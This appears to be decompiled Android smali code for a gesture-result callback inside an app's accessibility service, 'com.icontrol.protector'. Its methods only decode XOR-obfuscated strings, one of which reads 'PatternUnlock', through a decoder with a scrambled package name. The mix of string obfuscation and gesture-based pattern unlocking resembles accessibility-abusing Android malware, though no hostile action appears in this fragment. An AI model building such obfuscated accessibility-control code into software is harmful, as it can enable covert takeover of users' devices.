.class Lcom/icontrol/protector/AccessServices$a;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/AccessServices;->s(Ljava/util/List;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/AccessServices;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$a;->a:Lcom/icontrol/protector/AccessServices;

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;-><init>()V

    return-void
.end method


# virtual methods
.method public onCancelled(Landroid/accessibilityservice/GestureDescription;)V
    .locals 2

    const/16 p1, 0xd

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x1a

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 1
        -0x2t
        0x61t
        0x4at
        0x26t
        -0xdt
        0x74t
        -0x1t
        -0x14t
        -0x40t
        0x6ct
        0x51t
        0x31t
        -0x3t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x52t
        0x0t
        0x3et
        0x52t
        -0x6at
        0x6t
        -0x6ft
        -0x47t
    .end array-data

    :array_2
    .array-data 1
        0x37t
        -0x7et
        0xct
        -0x40t
        -0x52t
        -0x6at
        0x10t
        0x11t
        0x3t
        -0x6ft
        0x19t
        -0x3dt
        -0x5et
        -0x76t
        0x19t
        0x11t
        0x4t
        -0x7et
        0x16t
        -0x29t
        -0x52t
        -0x78t
        0x12t
        0x54t
        0x3t
        -0x33t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x67t
        -0x1dt
        0x78t
        -0x4ct
        -0x35t
        -0x1ct
        0x7et
        0x31t
    .end array-data
.end method

.method public onCompleted(Landroid/accessibilityservice/GestureDescription;)V
    .locals 2

    const/16 p1, 0xd

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x1b

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 1
        0x6ft
        0x59t
        -0x13t
        0x37t
        0x57t
        0x23t
        0x1et
        0x39t
        0x51t
        0x54t
        -0xat
        0x20t
        0x59t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3ft
        0x38t
        -0x67t
        0x43t
        0x32t
        0x51t
        0x70t
        0x6ct
    .end array-data

    :array_2
    .array-data 1
        0x6et
        -0x79t
        -0x3dt
        0x2at
        0x3t
        0x57t
        -0x2t
        0x10t
        0x5at
        -0x6ct
        -0x2at
        0x29t
        0x8t
        0x5t
        -0x1dt
        0x45t
        0x5dt
        -0x7bt
        -0x2et
        0x2dt
        0x15t
        0x43t
        -0x1bt
        0x5ct
        0x52t
        -0x61t
        -0x67t
    .end array-data

    :array_3
    .array-data 1
        0x3et
        -0x1at
        -0x49t
        0x5et
        0x66t
        0x25t
        -0x70t
        0x30t
    .end array-data
.end method
